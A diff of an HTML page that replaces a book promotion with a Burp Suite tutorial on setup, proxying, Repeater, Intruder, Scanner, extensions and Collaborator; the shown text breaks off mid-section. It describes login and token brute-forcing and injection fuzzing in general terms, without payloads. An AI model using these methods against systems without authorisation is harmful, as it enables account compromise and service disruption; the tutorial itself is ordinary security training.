+</head>
+<body>
+
+<div class="container">
+
+    <!-- ===== HEADER ===== -->
+    <header class="page-header">
+        <div class="badge">
+            <span class="dot"></span>
+            CYBERSUME · COMPLETE GUIDE
         </div>
-
-        <!-- ===== INTRODUCTION ===== -->
-        <p>
-            Welcome to The Burp Suite Compendium. If you've picked up this book—whether you're a seasoned security professional, a curious developer, or an aspiring penetration tester—you've taken an important step toward mastering one of the most powerful and essential tools in the web application security field.
+        <h1>Burp Suite <span class="highlight">Tools</span></h1>
+        <p class="subtitle">
+            The complete, in-depth guide to Burp Suite — the world's most popular web application security testing platform. 
+            From proxy setup to advanced exploitation.
         </p>
 
-        <!-- ===== FEATURED IMAGES WITH AMAZON LINK ===== -->
-        <div class="featured-box">
-            <div class="featured-image">
-                <a href="https://www.amazon.com/dp/B0H7FLRXFR" target="_blank" rel="noopener">
-                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJzQsxilUpQhaGIiM2cQLGeB6QwXvuMxRM1Qq06s7729HxSlFn4bJYebIuXyxZgt6D6p4Mjrnmka7FPwt7kw2VVMDByFRNjvXUBwAeiRqnHtIvscZLv5yqm2eVWEyiAPgGHNQ0-mMV5iMafFH_n-uma6DCaoT5O2POneqiMBaxpqpZ5jvRjnOYEPR9QUlm/s320/ChatGPT%20Image%20Jul%202,%202026,%2002_00_28%20PM.png" 
-                         alt="The Burp Suite Compendium Book"/>
-                </a>
-            
+        <div class="meta-bar">
+            <div class="meta-item"><span class="ico">📖</span> <span>Reading time: <strong>25 min</strong></span></div>
+            <div class="meta-item"><span class="ico">🕷️</span> <span>Category: <strong>Security Tools</strong></span></div>
+            <div class="meta-item"><span class="ico">🛡️</span> <span>Level: <strong>Beginner → Advanced</strong></span></div>
+            <div class="meta-item"><span class="ico">⚡</span> <span>Updated: <strong>2025</strong></span></div>
+        </div>
+    </header>
+
+    <!-- ===== TABLE OF CONTENTS ===== -->
+    <nav class="toc">
+        <div class="toc-title">📑 Table of Contents</div>
+        <ul class="toc-list">
+            <li><a href="#intro"><span class="num">01</span> Introduction</a></li>
+            <li><a href="#why"><span class="num">02</span> Why Burp Suite?</a></li>
+            <li><a href="#editions"><span class="num">03</span> Editions</a></li>
+            <li><a href="#install"><span class="num">04</span> Installation</a></li>
+            <li><a href="#proxy"><span class="num">05</span> Proxy Setup</a></li>
+            <li><a href="#intercept"><span class="num">06</span> Intercept &amp; HTTP History</a></li>
+            <li><a href="#repeater"><span class="num">07</span> Repeater</a></li>
+            <li><a href="#intruder"><span class="num">08</span> Intruder</a></li>
+            <li><a href="#scanner"><span class="num">09</span> Scanner</a></li>
+            <li><a href="#decoder"><span class="num">10</span> Decoder &amp; Comparer</a></li>
+            <li><a href="#extender"><span class="num">11</span> Extender &amp; BApps</a></li>
+            <li><a href="#collab"><span class="num">12</span> Collaborator</a></li>
+            <li><a href="#workflow"><span class="num">13</span> Testing Workflow</a></li>
+            <li><a href="#best"><span class="num">14</span> Best Practices</a></li>
+            <li><a href="#legal"><span class="num">15</span> Legal &amp; Ethics</a></li>
+            <li><a href="#conclusion"><span class="num">16</span> Conclusion</a></li>
+        </ul>
+    </nav>
+
+    <!-- ===== 01 INTRO ===== -->
+    <section class="section" id="intro">
+        <span class="section-number">01 · INTRODUCTION</span>
+        <h2 class="section-title">
+            <span class="icon">🕷️</span>
+            What Is Burp Suite?
+        </h2>
+        <p>
+            <strong>Burp Suite</strong> is the world's most popular <em>web application security testing platform</em>, developed by <strong>PortSwigger</strong>. It's an integrated toolkit that acts as an <strong>intercepting proxy</strong>, letting you capture, inspect, modify, and replay HTTP/S traffic between your browser and any web application.
+        </p>
+        <p>
+            Since its first release in 2003, Burp Suite has become the <strong>industry standard</strong> for web pentesting. Almost every professional bug bounty hunter, web pentester, and security researcher uses it daily. It combines a proxy, a scanner, an intruder (fuzzer), a repeater, and dozens of other tools into one unified interface.
+        </p>
+        <p>
+            If you're serious about web security, Burp Suite is not optional — it's <strong>mandatory</strong>. Understanding it deeply separates hobbyists from professional bug bounty hunters.
+        </p>
+        <div class="callout info">
+            <strong>💡 Note:</strong> Burp Suite is written in Java, so it runs on Windows, Linux, and macOS. Kali Linux comes with the Community Edition pre-installed.
+        </div>
+    </section>
+
+    <!-- ===== 02 WHY ===== -->
+    <section class="section" id="why">
+        <span class="section-number">02 · WHY BURP SUITE</span>
+        <h2 class="section-title">
+            <span class="icon">💡</span>
+            Why Burp Suite?
+        </h2>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">🎯</span>
+                <h4>Industry Standard</h4>
+                <p>The de facto tool for web pentesting and bug bounties worldwide.</p>
             </div>
-            <div class="featured-cta">
-                <p>📚 <strong style="color:#00ff88;">Get Your Copy Today!</strong></p>
-                <a class="main-link" href="https://www.amazon.com/dp/B0H7FLRXFR" target="_blank" rel="noopener">
-                    🛒 Buy Now on Amazon
-                </a>
-                
+            <div class="use-card">
+                <span class="use-icon">🔧</span>
+                <h4>All-in-One</h4>
+                <p>Proxy, scanner, intruder, repeater, decoder — everything in one place.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🔌</span>
+                <h4>Extensible</h4>
+                <p>Thousands of BApps and extensions to extend functionality.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">⚡</span>
+                <h4>Powerful Automation</h4>
+                <p>Intruder + Macros + Session Handling = massive automation.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📊</span>
+                <h4>Clean Interface</h4>
+                <p>Intuitive UI with powerful keyboard shortcuts.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🌐</span>
+                <h4>PortSwigger Academy</h4>
+                <p>Free, world-class web security training built around Burp.</p>
+            </div>
+        </div>
+        <div class="callout">
+            <strong>🔑 Key Insight:</strong> If you can only learn one tool for web pentesting, make it Burp Suite. Everything else is secondary.
+        </div>
+    </section>
+
+    <!-- ===== 03 EDITIONS ===== -->
+    <section class="section" id="editions">
+        <span class="section-number">03 · EDITIONS</span>
+        <h2 class="section-title">
+            <span class="icon">📦</span>
+            Burp Suite Editions
+        </h2>
+
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Edition</th><th>Price</th><th>Key Features</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><strong>Community</strong></td><td>Free</td><td>Proxy, Repeater, Intruder (throttled), Decoder, Comparer</td></tr>
+                    <tr><td><strong>Professional</strong></td><td>~$475/yr</td><td>+ Automated Scanner, unlimited Intruder, BApps, project files</td></tr>
+                    <tr><td><strong>Enterprise</strong></td><td>~$5,000/yr</td><td>+ CI/CD integration, scheduling, collaboration</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="callout info">
+            <strong>💡 Note:</strong> The <strong>Community Edition</strong> is free and fully functional for manual testing. The main limitation is throttled Intruder (fixed at 1 request/second) and no automated scanner. For learning and bug bounties, Community is often enough.
+        </div>
+    </section>
+
+    <!-- ===== 04 INSTALL ===== -->
+    <section class="section" id="install">
+        <span class="section-number">04 · INSTALLATION</span>
+        <h2 class="section-title">
+            <span class="icon">⬇️</span>
+            Installing Burp Suite
+        </h2>
+
+        <h3>Option 1: Pre-installed on Kali</h3>
+        <p>Burp Suite comes pre-installed on Kali Linux. Just search "Burp" in the application menu, or run from terminal:</p>
+        <div class="code-block" data-lang="bash">
+<code>burpsuite</code>
+        </div>
+
+        <h3>Option 2: Download from PortSwigger</h3>
+        <p>Download the installer from <a href="https://portswigger.net/burp/communitydownload" target="_blank">portswigger.net/burp/communitydownload</a>.</p>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Make the installer executable</span>
+<span class="cmd">chmod</span> +x burpsuite_community_linux_v2025.x.sh
+
+<span class="cmt"># Run the installer</span>
+<span class="cmd">./burpsuite_community_linux_v2025.x.sh</span>
+
+<span class="cmt"># Or use the JAR version directly</span>
+<span class="cmd">java</span> -jar burpsuite_community_v2025.x.jar</code>
+        </div>
+
+        <h3>Option 3: Install via Snap (Ubuntu)</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmd">sudo</span> snap install burpsuite --classic</code>
+        </div>
+    </section>
+
+    <!-- ===== 05 PROXY ===== -->
+    <section class="section" id="proxy">
+        <span class="section-number">05 · PROXY SETUP</span>
+        <h2 class="section-title">
+            <span class="icon">🔌</span>
+            Proxy Setup
+        </h2>
+        <p>
+            Burp's <strong>Proxy</strong> is its core feature. It sits between your browser and the target web application, letting you intercept and modify traffic in real time.
+        </p>
+
+        <h3>Step 1: Configure Burp Proxy Listener</h3>
+        <ul>
+            <li>Open Burp → <strong>Proxy</strong> tab → <strong>Options</strong> → <strong>Proxy Listeners</strong></li>
+            <li>Default listener: <code>127.0.0.1:8080</code></li>
+            <li>Enable "Running" checkbox</li>
+            <li>(Optional) Bind to all interfaces: <code>0.0.0.0:8080</code> for external devices</li>
+        </ul>
+
+        <h3>Step 2: Configure Browser Proxy</h3>
+        <p>Two options:</p>
+        <ol>
+            <li><strong>Burp's built-in browser</strong> — Easiest. Click <em>Proxy → Intercept → Open Browser</em>. It comes pre-configured.</li>
+            <li><strong>Manual browser config</strong> — Use FoxyProxy or system proxy settings:
+                <ul>
+                    <li>HTTP Proxy: <code>127.0.0.1</code></li>
+                    <li>Port: <code>8080</code></li>
+                </ul>
+            </li>
+        </ol>
+
+        <h3>Step 3: Install Burp CA Certificate</h3>
+        <p>To intercept HTTPS traffic, you must trust Burp's CA certificate:</p>
+        <ol>
+            <li>With Burp proxy active, browse to <code>http://burp</code></li>
+            <li>Click "CA Certificate" to download <code>cacert.der</code></li>
+            <li>Import into browser: <em>Settings → Privacy → Certificates → Import</em></li>
+            <li>For Firefox, you may need to set <code>security.enterprise_roots.enabled = true</code></li>
+        </ol>
+
+        <div class="callout info">
+            <strong>💡 Note:</strong> Burp's built-in browser handles certificate installation automatically — it's the easiest option for beginners.
+        </div>
+    </section>
+
+    <!-- ===== 06 INTERCEPT ===== -->
+    <section class="section" id="intercept">
+        <span class="section-number">06 · INTERCEPT</span>
+        <h2 class="section-title">
+            <span class="icon">🛑</span>
+            Intercept &amp; HTTP History
+        </h2>
+
+        <h3>Intercept Tab</h3>
+        <p>When "Intercept is on", every request is paused before being sent to the server. You can:</p>
+        <ul>
+            <li><strong>Forward</strong> — Send request as-is to the server</li>
+            <li><strong>Drop</strong> — Discard the request</li>
+            <li><strong>Edit</strong> — Modify headers, parameters, cookies</li>
+            <li><strong>Action</strong> — Send to Repeater, Intruder, Scanner, etc.</li>
+        </ul>
+
+        <h3>HTTP History Tab</h3>
+        <p>The HTTP History shows every request/response that passed through the proxy. This is your <strong>audit trail</strong> — search, filter, and analyze traffic here.</p>
+
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">🔍</span>
+                <h4>Search Filter</h4>
+                <p>Filter by status code, MIME type, or search within responses.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🎯</span>
+                <h4>Scope</h4>
+                <p>Define in-scope targets — everything else gets filtered out.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📤</span>
+                <h4>Send to Tools</h4>
+                <p>Right-click any request → send to Repeater, Intruder, etc.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🗂️</span>
+                <h4>Organize</h4>
+                <p>Highlight, comment, and annotate interesting requests.</p>
             </div>
         </div>
 
-        <!-- ===== WHO THIS BOOK IS FOR ===== -->
-        <h2 id="who">🎯 Who This Book Is For</h2>
-        <p>
-            This book is written for anyone who wants to understand, configure, and leverage Burp Suite to its full potential. You might be:
-        </p>
-        <ul>
-            <li>A penetration tester or security consultant looking to deepen your expertise and discover advanced workflows that save time and uncover more vulnerabilities.</li>
-            <li>A bug bounty hunter seeking to maximize your efficiency and success rate by mastering automation, extension, and manual testing techniques.</li>
-            <li>A web developer or DevOps engineer wanting to understand how attackers view your applications and learn how to identify security flaws before they reach production.</li>
-            <li>A student or career-changer taking your first steps into cybersecurity, looking for a structured, practical guide that bridges theory and hands-on practice.</li>
-        </ul>
-        <p>
-            Whatever your background, I've designed this book to meet you where you are. You don't need to be a security expert to begin—though by the end, you'll certainly think like one. The only prerequisite is a basic understanding of how the web works: HTTP/HTTPS, requests and responses, cookies, and common web technologies. Everything beyond that, this book will teach you.
-        </p>
-
-        <hr/>
-
-        <!-- ===== WHAT YOU WILL LEARN ===== -->
-        <h2 id="learn">📖 What You Will Learn</h2>
-        <p>
-            This book is a complete journey through the Burp Suite ecosystem. By the time you finish reading, you will be able to:
-        </p>
-        <ul class="two-col-list">
-            <li>Set up and configure Burp Suite in a professional testing environment</li>
-            <li>Intercept and manipulate HTTP/HTTPS traffic in real time using the Proxy tool</li>
-            <li>Manually test for vulnerabilities using Repeater—modifying requests, observing responses, and pinpointing flaws</li>
-            <li>Automate attacks with Intruder, from brute-forcing credentials to fuzzing for SQL injection and XSS</li>
-            <li>Decode, compare, and analyze data using Decoder, Comparer, and Sequencer</li>
-            <li>Extend Burp's functionality with powerful plugins from the BApp Store and even write your own extensions</li>
-            <li>Leverage Burp Scanner for automated vulnerability discovery (Professional edition)</li>
-            <li>Test modern APIs, JWTs, GraphQL, and more with advanced techniques</li>
-            <li>Generate professional reports that clearly communicate findings to technical and non-technical stakeholders</li>
-        </ul>
-        <p>
-            More importantly, you'll learn how to think like a web application security tester—methodical, curious, and relentless in your pursuit of security weaknesses.
-        </p>
-
-        <hr/>
-
-        <!-- ===== HOW THIS BOOK IS STRUCTURED ===== -->
-        <h2 id="structure">📚 How This Book Is Structured</h2>
-        <p>
-            I've organized this book to follow the natural workflow of a penetration test, from initial setup to final reporting. Each chapter builds on the previous ones, but you can also jump directly to topics that interest you:
-        </p>
-        <ul>
-            <li><strong style="color:#00ff88;">Chapters 1–2:</strong> Cover the essentials: installation, configuration, and the foundational Proxy tool.</li>
-            <li><strong style="color:#00ff88;">Chapters 3–4:</strong> Dive into manual and automated testing with Repeater and Intruder.</li>
-            <li><strong style="color:#00ff88;">Chapters 5–6:</strong> Explore the supporting tools—Decoder, Comparer, Sequencer, and Extender—that turn a good tester into a great one.</li>
-            <li><strong style="color:#00ff88;">Chapters 7–9:</strong> Address advanced workflows, automation, reporting, and the OWASP Top 10.</li>
-            <li><strong style="color:#00ff88;">Chapter 10:</strong> Brings everything together with real-world testing workflows.</li>
-        </ul>
-        <div class="tip-box">
-            <p>💡 Throughout every chapter, you'll find practical examples drawn from the PortSwigger Web Security Academy labs—free, safe, and legal environments where you can practice every technique described in this book. I strongly encourage you to follow along and perform these exercises yourself. Security testing is a hands-on skill, and reading alone is never enough.</p>
+        <h3>Target Scope</h3>
+        <div class="code-block" data-lang="text">
+<code>Recommended Scope Setup:
+────────────────────────────
+Include: *.target.com
+Include: api.target.com
+Exclude: *.google.com
+Exclude: *.facebook.com
+Exclude: *.cloudflare.com</code>
         </div>
+    </section>
 
-        <hr/>
-
-        <!-- ===== ETHICS AND LEGALITY ===== -->
-        <h2 id="ethics">⚖️ A Note on Ethics and Legality</h2>
-        <div class="ethics-box">
-            <p class="ethics-title">🛡️ Before you turn another page...</p>
-            <p style="color:#ff6b6b !important;font-size:15px;">
-                The techniques in this book are tools for <strong style="color:#ff6b6b;">defense</strong>, not offense. You must use them only on systems you own or have explicit, written permission to test.
-            </p>
-        </div>
+    <!-- ===== 07 REPEATER ===== -->
+    <section class="section" id="repeater">
+        <span class="section-number">07 · REPEATER</span>
+        <h2 class="section-title">
+            <span class="icon">🔁</span>
+            Repeater — Manual Request Crafting
+        </h2>
         <p>
-            <strong style="color:#ff6b6b;">Unauthorized testing is:</strong>
-        </p>
-        <ul>
-            <li><strong style="color:#ff6b6b;">Illegal</strong> — violating laws like the Computer Fraud and Abuse Act (CFAA) in the US and similar legislation worldwide.</li>
-            <li><strong style="color:#ff6b6b;">Unethical</strong> — disrespecting the privacy and security of others.</li>
-            <li><strong style="color:#ff6b6b;">Counterproductive</strong> — destroying trust and damaging the security community's reputation.</li>
-        </ul>
-        <p>
-            Always operate with a clear scope of work, signed authorization, and a commitment to responsible disclosure. If you're practicing on the PortSwigger labs or other deliberately vulnerable platforms, you're in safe territory. For everything else, get permission first.
+            <strong>Repeater</strong> lets you manually modify and resend any request as many times as you want. It's the most-used Burp tool for manual web testing — perfect for testing edge cases, payloads, and logic flaws.
         </p>
 
-        <hr/>
+        <h3>Workflow</h3>
+        <ol>
+            <li>From HTTP History, right-click a request → <strong>Send to Repeater</strong></li>
+            <li>Go to the Repeater tab</li>
+            <li>Modify the request as needed</li>
+            <li>Click <strong>Send</strong> (or <code>Ctrl+Space</code>)</li>
+            <li>Analyze the response on the right pane</li>
+        </ol>
 
-        <!-- ===== WHY BURP SUITE MATTERS ===== -->
-        <h2 id="why">🔧 Why Burp Suite Matters</h2>
-        <p>
-            In a world where web applications are the backbone of commerce, communication, and critical infrastructure, securing them has never been more important. Attackers are sophisticated, relentless, and well-funded. Defenders need tools that match that sophistication.
-        </p>
-        <p>
-            Burp Suite is the industry standard for a reason. It doesn't just automate scans—it empowers you to think, explore, and adapt. The best tests are not run by scripts; they are run by curious, creative humans who use Burp Suite to amplify their skills.
-        </p>
-        <p>
-            This book is your invitation to become one of those humans.
-        </p>
-
-        <hr/>
-
-        <!-- ===== HOW TO GET THE MOST ===== -->
-        <h2 id="how">📘 How to Get the Most from This Book</h2>
-        <ul>
-            <li><strong style="color:#00ff88;">Read actively.</strong> Have Burp Suite open alongside this book. Follow along with the examples.</li>
-            <li><strong style="color:#00ff88;">Practice relentlessly.</strong> After each chapter, spend time on the PortSwigger Web Security Academy labs. The repetition builds muscle memory.</li>
-            <li><strong style="color:#00ff88;">Experiment.</strong> Don't just copy examples—change parameters, try different payloads, and see what happens. Mistakes are the best teachers.</li>
-            <li><strong style="color:#00ff88;">Join the community.</strong> Engage with other Burp Suite users on forums, Discord, and at security conferences. Share your discoveries and learn from others.</li>
-            <li><strong style="color:#00ff88;">Keep learning.</strong> The security landscape evolves daily. Burp Suite updates regularly, and new extensions appear constantly. Treat this book as your foundation, not your final destination.</li>
-        </ul>
-
-        <hr/>
-
-        <!-- ===== PERSONAL NOTE ===== -->
-        <h2 id="personal">✍️ A Personal Note</h2>
-        <p>
-            I've written this book because I believe in the power of knowledge and the importance of strong defenses. Over years of testing applications—from small startups to global enterprises—I've seen how the right tool in the right hands can prevent data breaches, protect user privacy, and ultimately save organizations from disaster.
-        </p>
-        <p>
-            My goal is to pass on not just technical skills, but also the mindset and discipline that separate effective testers from those who simply run scanners and hope for the best. If I succeed, you'll not only be more skilled—you'll be more confident, more methodical, and more valuable to any team you join.
-        </p>
-        <p>
-            Thank you for entrusting me with your learning journey. Let's begin.
-        </p>
-
-        <!-- ===== AUTHOR BOX ===== -->
-        <div class="author-box">
-            <p class="author-name">Z.B Sume</p>
-            <p class="author-title">Cybersecurity Researcher and Burp Suite Enthusiast</p>
-            <p style="color:#6a7290;font-size:14px;margin-top:5px !important;">
-                Helping security professionals master web application testing
-            </p>
-        </div>
-
-        <!-- ===== FINAL CTA ===== -->
-        <div class="book-highlight" style="border-color:#ffcc00;background:linear-gradient(135deg,rgba(255,204,0,0.05),rgba(0,255,136,0.05));">
-            <p class="highlight-title" style="color:#ffcc00;">🛡️ Ready to Master Burp Suite?</p>
-            <p style="color:#b0b8c8;font-size:16px;">
-                Start your journey to becoming a web application security expert today.
-            </p>
-            <br/>
-            <a class="main-link" href="https://www.amazon.com/dp/B0H7FLRXFR" target="_blank" rel="noopener" 
-               style="display:inline-block;padding:15px 42px;background:linear-gradient(135deg,#ffcc00,#ff9900);color:#000000 !important;border-radius:10px;font-weight:700;font-size:16px;text-decoration:none;transition:all 0.3s ease;letter-spacing:0.5px;">
-                🛒 Buy Now on Amazon
-            </a>
-            <p class="small-note" style="color:#6a7290 !important;font-size:13px;margin-top:12px;">
-                Start your Burp Suite journey today — Get your copy now!
-            </p>
-        </div>
-
-        <hr/>
-
-        <!-- ===== SHARE SECTION ===== -->
-        <div class="share-section">
-            <p>📤 Share this book recommendation with your network</p>
-            <div class="share-buttons">
-                <a href="#" onclick="window.open('https://twitter.com/intent/tweet?text=The%20Burp%20Suite%20Compendium%20-%20Master%20one%20of%20the%20most%20powerful%20tools%20in%20web%20application%20security!%20%23BurpSuite%20%23CyberSecurity%20%23WebSecurity','_blank');return false;">
-                    🐦 Twitter
-                </a>
-                <a href="#" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(window.location.href),'_blank');return false;">
-                    📘 Facebook
-                </a>
-                <a href="#" onclick="window.open('https://www.linkedin.com/sharing/share-offsite/?url='+encodeURIComponent(window.location.href),'_blank');return false;">
-                    💼 LinkedIn
-                </a>
+        <h3>Common Uses</h3>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">💉</span>
+                <h4>SQL Injection Testing</h4>
+                <p>Manually inject payloads and observe responses.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🕸️</span>
+                <h4>XSS Testing</h4>
+                <p>Test reflected and stored XSS in different contexts.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🔓</span>
+                <h4>Access Control</h4>
+                <p>Change user IDs, tokens, or roles to test authorization.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🎯</span>
+                <h4>Parameter Fuzzing</h4>
+                <p>Modify values one at a time to find edge cases.</p>
             </div>
         </div>
 
-    </div>
+        <div class="callout">
+            <strong>💡 Pro Tip:</strong> Use Repeater with tabs to test multiple scenarios in parallel. Right-click a tab to rename it for clarity.
+        </div>
+    </section>
+
+    <!-- ===== 08 INTRUDER ===== -->
+    <section class="section" id="intruder">
+        <span class="section-number">08 · INTRUDER</span>
+        <h2 class="section-title">
+            <span class="icon">🎯</span>
+            Intruder — Automated Fuzzing
+        </h2>
+        <p>
+            <strong>Intruder</strong> automates the process of sending many requests with different payloads. It's used for brute-forcing, fuzzing, and enumeration.
+        </p>
+
+        <h3>Attack Types</h3>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Type</th><th>Purpose</th><th>Example</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><strong>Sniper</strong></td><td>One payload set, one position at a time</td><td>Password brute-force</td></tr>
+                    <tr><td><strong>Battering Ram</strong></td><td>Same payload in all positions</td><td>Same value in multiple params</td></tr>
+                    <tr><td><strong>Pitchfork</strong></td><td>Multiple payload sets, parallel</td><td>User:pass pairs from a list</td></tr>
+                    <tr><td><strong>Cluster Bomb</strong></td><td>All combinations</td><td>user × pass matrix</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>Intruder Workflow</h3>
+        <ol>
+            <li>Send a request to Intruder (<code>Ctrl+I</code>)</li>
+            <li>Go to <strong>Positions</strong> tab — clear existing markers</li>
+            <li>Select the value to fuzz → click <strong>Add §</strong></li>
+            <li>Go to <strong>Payloads</strong> tab → load your wordlist</li>
+            <li>(Optional) Add processing rules: hash, encode, prefix/suffix</li>
+            <li>Click <strong>Start Attack</strong></li>
+            <li>Sort results by Status Code, Length, or Time to spot anomalies</li>
+        </ol>
+
+        <h3>Common Intruder Uses</h3>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">🔑</span>
+                <h4>Login Brute-Force</h4>
+                <p>Sniper attack on the password field with a wordlist.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📂</span>
+                <h4>Directory Fuzzing</h4>
+                <p>Enumerate hidden files/directories using common wordlists.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🔍</span>
+                <h4>Parameter Enumeration</h4>
+                <p>Discover hidden parameters and their valid values.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">💉</span>
+                <h4>SQLi Fuzzing</h4>
+                <p>Test many SQL injection payloads in bulk.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🕸️</span>
+                <h4>XSS Fuzzing</h4>
+                <p>Test different XSS payloads across input fields.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🎟️</span>
+                <h4>Token Brute-Force</h4>
+                <p>Guess predictable session tokens or API keys.</p>
+            </div>
+        </div>
+
+        <div class="callout warn">
+            <strong>⚠️ Warning:</strong> Intruder generates lots of traffic. Never use it against production systems without explicit permission. It can cause DoS and lock accounts.
+        </div>
+    </section>
+
+    <!-- ===== 09 SCANNER ===== -->
+    <section class="section" id="scanner">
+        <span class="section-number">09 · SCANNER</span>
+        <h2 class="section-title">
+            <span class="icon">🔍</span>
+            Scanner (Pro Only)
+        </h2>
+        <p>
+            The <strong>Scanner</strong> automatically crawls and audits web applications for vulnerabilities. It's only available in Burp <strong>Professional</strong>.
+        </p>
+
+        <h3>Scanner Phases</h3>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">🕷️</span>
+                <h4>Crawl</h4>
+                <p>Discovers all endpoints, parameters, and forms.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🔬</span>
+                <h4>Audit</h4>
+                <p>Actively tests for vulnerabilities — SQLi, XSS, SSRF, etc.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📊</span>
+                <h4>Report</h4>
+                <p>Generates findings with severity, evidence, and remediation.</p>
+            </div>
+        </div>
+
+        <h3>Scan Types</h3>
+        <ul>
+            <li><strong>Passive scan</strong> — Analyzes traffic silently, no extra requests</li>
+            <li><strong>Active scan</strong> — Sends payloads to actively test for vulns</li>
+            <li><strong>Crawl + Audit</strong> — Full scan of an entire site</li>
+            <li><strong>Scan selected insertion point</strong> — Scan a single parameter</li>
+        </ul>
+
+        <div class="callout info">
+            <strong>💡 Alternative:</strong> If you're on Community Edition, use <strong>Burp's BApp store</strong> to install "Burp Scanner" alternatives — or pair Burp with OWASP ZAP for automated scanning.
+        </div>
+    </section>
+
+    <!-- ===== 10 DECODER ===== -->
+    <section class="section" id="decoder">
+        <span class="section-number">10 · DECODER &amp; COMPARER</span>
+        <h2 class="section-title">
+            <span class="icon">🔤</span>
+            Decoder &amp; Comparer
+        </h2>
+
+        <h3>Decoder</h3>
+        <p>Decoder transforms data between formats — perfect for working with encoded payloads.</p>
+
+        <div class="code-block" data-lang="text">
+<code>Supported Formats:
+────────────────────────────
+Base64          →  RW5jb2RlZA==
+URL             →  %20%41%42%43
+HTML            →  &amp;lt;script&amp;gt;
+Hex             →  48656c6c6f
+ASCII Hex       →  \x48\x65\x6c\x6c\x6f
+Gzip            →  compressed data
+Binary          →  01001000 01100101</code>
+        </div>
+
+        <h3>Comparer</h3>
+        <p>Comparer shows the difference between two requests or responses — useful for finding subtle changes after fuzzing.</p>
+        <ul>
+            <li>Send two responses to Comparer</li>
+            <li>Choose <strong>Words</strong> or <strong>Bytes</strong> comparison</li>
+            <li>Highlighted differences show up immediately</li>
+        </ul>
+    </section>
+
+    <!-- ===== 11 EXTENDER ===== -->
+    <section class="section" id="extender">
+        <span class="section-number">11 · EXTENDER</span>
+        <h2 class="section-title">
+            <span class="icon">🔌</span>
+            Extender &amp; BApps
+        </h2>
+        <p>
+            Burp is extensible via the <strong>BApp Store</strong> — free and paid extensions written in Java, Python (Jython), or Ruby (JRuby). Extensions add features, integrate tools, and automate tasks.
+        </p>
+
+        <h3>Must-Have BApps</h3>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">🐍</span>
+                <h4>Logger++</h4>
+                <p>Advanced logging with filtering and exporting.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🔍</span>
+                <h4>Autorize</h4>
+                <p>Automated access control testing across user roles.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">💥</span>
+                <h4>Turbo Intruder</h4>
+                <p>Massive-scale HTTP request engine — faster than Intruder.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🕸️</span>
+                <h4>J2EEScan</h4>
+                <p>Scans Java web apps for common vulnerabilities.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🎯</span>
+                <h4>Collaborator Everywhere</h4>
+                <p>Auto-injects Collaborator payloads into every request.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🔓</span>
+                <h4>JWT Editor</h4>
+                <p>Craft, sign, and tamper with JSON Web Tokens.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📦</span>
+                <h4>Param Miner</h4>
+                <p>Discover hidden parameters and headers.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🔐</span>
+                <h4>Hackvertor</h4>
+                <p>Advanced payload encoding and transformation tags.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🎣</span>
+                <h4>Active Scan++</h4>
+                <p>Extra active scan checks (Pro only).</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📊</span>
+                <h4>Burp Bounty</h4>
+                <p>Custom vulnerability scanning profiles.</p>
+            </div>
+        </div>
+
+        <h3>Installing Extensions</h3>
+        <ol>
+            <li>Go to <strong>Extender</strong> tab → <strong>BApp Store</strong></li>
+            <li>Browse or search for extensions</li>
+            <li>Click <strong>Install</strong></li>
+        </ol>
+
+        <div class="callout">
+            <strong>💡 Pro Tip:</strong> For custom extensions, enable <strong>Jython</strong> or <strong>JRuby</strong> in Extender → Options. Then load your own Python scripts that extend Burp.
+        </div>
+    </section>
+
+    <!-- ===== 12 COLLAB ===== -->
+    <section class="section" id="collab">
+        <span class="section-number">12 · COLLABORATOR</span>
+        <h2 class="section-title">
+            <span class="icon">📡</span>
+            Burp Collaborator
+        </h2>
+        <p>
+            <strong>Burp Collaborator</strong> is a server that detects <em>out-of-band</em> vulnerabilities — bugs that don't show up in responses but trigger external interactions. Essential for finding <strong>blind SSRF, blind XXE, blind RCE</strong>, and more.
+        </p>
+
+        <h3>How It Works</h3>
+        <ol>
+            <li>Burp generates a unique Collaborator subdomain</li>
